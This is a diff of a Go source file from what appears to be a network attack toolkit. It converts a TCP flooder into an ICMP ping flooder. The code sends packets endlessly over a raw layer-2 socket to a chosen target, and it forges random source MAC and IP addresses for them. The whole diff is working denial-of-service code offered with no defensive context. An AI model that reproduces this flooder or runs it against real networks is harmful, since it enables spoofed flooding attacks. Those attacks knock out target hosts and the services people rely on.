@@ -15,7 +15,7 @@
  * along with this program.  If not, see <https://www.gnu.org>.
  */
 
-package floodtcp
+package floodping
 
 import (
 	"fmt"
@@ -34,28 +34,27 @@ import (
 
 
 func Run(args []string) {
-    New(args).Execute()
+    newPingFlooder(args).execute()
 }
 
 
 
-type TcpFlooder struct {
-    builder   *packet.TcpPkt
+type PingFlooder struct {
+    rand      *generators.RandomValues
+    builder   *packet.IcmpPkt
     iface     *net.Interface
     pktsSent   int
-    rand      *generators.RandomValues
     srcIP      net.IP
     srcMAC     net.HardwareAddr
     dstIP      net.IP
     dstMAC     net.HardwareAddr
-    dstPort    uint16
     duration   float64
 }
 
 
 
-func New(argList []string) *TcpFlooder {
-    args   := ParseTcpArgs(argList)
+func newPingFlooder(argList []string) *PingFlooder {
+	args   := ParsePingArgs(argList)
 
 	dstIP  := conv.MustStrToIPv4(args.DstIP)
 	dstMAC := conv.MustStrToMac(args.DstMAC)
@@ -67,51 +66,51 @@ func New(argList []string) *TcpFlooder {
 	srcMAC := sysinfo.ResolveMac(args.SrcMAC, iface)
 
     firstIP, lastIP := utils.GetFirstAndLastIP(cidr)
-	
-	randGen := generators.NewRandomValues(&firstIP, &lastIP)
 
-    return &TcpFlooder{
-        builder:   packet.NewTcpPkt(),
-        iface:     iface,
+    randGen := generators.NewRandomValues(&firstIP, &lastIP)
+
+
+    return &PingFlooder{
         rand:      randGen,
+        builder:   packet.NewIcmpPkt(),
+        iface:     iface,
         srcIP:     srcIP,
         srcMAC:    srcMAC,
         dstIP:     dstIP,
         dstMAC:    dstMAC,
-        dstPort:   args.Port,
     }
 }
 
 
 
-func (t *TcpFlooder) Execute() {
-    t.displayInfo()
-    t.sendEndlessly()
-    t.displayExecInfo()
+func (p *PingFlooder) execute() {
+    p.displayInfo()
+    p.sendEndlessly()
+    p.displayExecInfo()
 }
 
 
 
-func (t *TcpFlooder) displayInfo() {
+func (p *PingFlooder) displayInfo() {
     srcMACStr := "Random"
-    if t.srcMAC != nil {
-        srcMACStr = t.srcMAC.String()
+	if p.srcMAC != nil {
+        srcMACStr = p.srcMAC.String()
     }
 
 	srcIPStr := "Random"
-    if t.srcIP != nil {
-        srcIPStr = t.srcIP.String()
+    if p.srcIP != nil {
+        srcIPStr = p.srcIP.String()
     }
 
-	fmt.Printf("[*] SRC >> MAC: %s / IP: %s\n", srcMACStr, srcIPStr)
-    fmt.Printf("[*] DST >> MAC: %s / IP: %s\n", t.dstMAC.String(), t.dstIP.String())
-    fmt.Printf("[*] IFACE: %s\n", t.iface.Name)
+    fmt.Printf("[*] SRC >> MAC: %s / IP: %s\n", srcMACStr, srcIPStr)
+    fmt.Printf("[*] DST >> MAC: %s / IP: %s\n", p.dstMAC.String(), p.dstIP.String())
+    fmt.Printf("[*] IFACE: %s\n", p.iface.Name)
 }
 
 
 
-func (t *TcpFlooder) sendEndlessly() {
-    socket := sockets.NewL2Socket(t.iface)
+func (p *PingFlooder) sendEndlessly() {
+    socket := sockets.NewL2Socket(p.iface)
     ctx    := utils.SignalContext()
 
     fmt.Println("[+] Sending packets. Press CTRL + C to stop")
@@ -121,41 +120,40 @@ func (t *TcpFlooder) sendEndlessly() {
         select {
         case <-ctx.Done():
             fmt.Println("\n[-] Flood interrupted")
-            t.duration = time.Since(start).Seconds()
+            p.duration = time.Since(start).Seconds()
             return
         
 		default:
-            pkt := t.getPkt()
+            pkt := p.getPacket()
             socket.Send(pkt)
-            t.pktsSent++
+            p.pktsSent++
         }
     }
 }
 
 
 
-func (t *TcpFlooder) getPkt() []byte {
-    srcMAC := t.srcMAC
-    if srcMAC == nil {
-        srcMAC = t.rand.RandomMac()
+func (p *PingFlooder) getPacket() []byte {
+    srcMAC := p.srcMAC
+	if srcMAC == nil {
+        srcMAC = p.rand.RandomMac()
     }
 
-	srcIP := t.srcIP
+	srcIP := p.srcIP
     if srcIP == nil {
-        srcIP = t.rand.RandomIP()
+        srcIP = p.rand.RandomIP()
     }
 
-	srcPort := t.rand.RandomPort()
-
-	return t.builder.L2Pkt(srcMAC, srcIP, srcPort, t.dstMAC, t.dstIP, t.dstPort)
+	return p.builder.L2Pkt(srcMAC, srcIP, p.dstMAC, p.dstIP)
 }
 
 
 
-func (t *TcpFlooder) displayExecInfo() {
-    fmt.Printf("[%%] %d packets sent in %.2f seconds\n", t.pktsSent, t.duration)
-    if t.duration > 1.0 {
-        rate := float64(t.pktsSent) / t.duration
+func (p *PingFlooder) displayExecInfo() {
+    fmt.Printf("[%%] %d packets sent in %.2f seconds\n", p.pktsSent, p.duration)
+    
+	if p.duration > 1.0 {
+        rate := float64(p.pktsSent) / p.duration
         fmt.Printf("[%%] %.2f packets sent per second\n", rate)
     }
 }
